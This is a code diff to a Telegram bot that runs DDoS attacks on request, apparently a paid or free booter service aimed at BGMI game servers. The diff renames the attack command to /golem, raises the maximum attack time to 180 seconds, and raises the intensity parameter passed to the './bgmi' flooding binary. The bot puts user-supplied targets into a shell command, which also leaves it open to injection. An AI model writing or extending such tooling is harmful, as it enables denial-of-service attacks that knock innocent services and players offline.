@@ -306,7 +306,7 @@ def handle_bgmi(message):
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
-                response = "You Are On Cooldown ❌. Please Wait 20 sec Before Running The /bgmi Command Again."
+                response = "You Are On Cooldown ❌. Please Wait 20 sec Before Running The /golem Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -317,18 +317,18 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
-            if time > 121:
-                response = "Error: Time interval must be less than 120."
+            if time > 181:
+                response = "Error: Time interval must be less than 180."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 400"
+                full_command = f"./bgmi {target} {port} {time} 900"
                 process = subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
         else:
-            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Updated command syntax
+            response = "✅ Usage :- /golem <target> <port> <time>"  # Updated command syntax
     else:
         response = ("🚫 Unauthorized Access! 🚫\n\nJOIN BOTH CHANNELS TO GET FREE OR PAID ACCES \n\n @golemhacks AND @golemfeedbacks \n\n NOW SEND YOUR USER ID TO @GOLEM_OWNER FOR APPROVAL ")
 
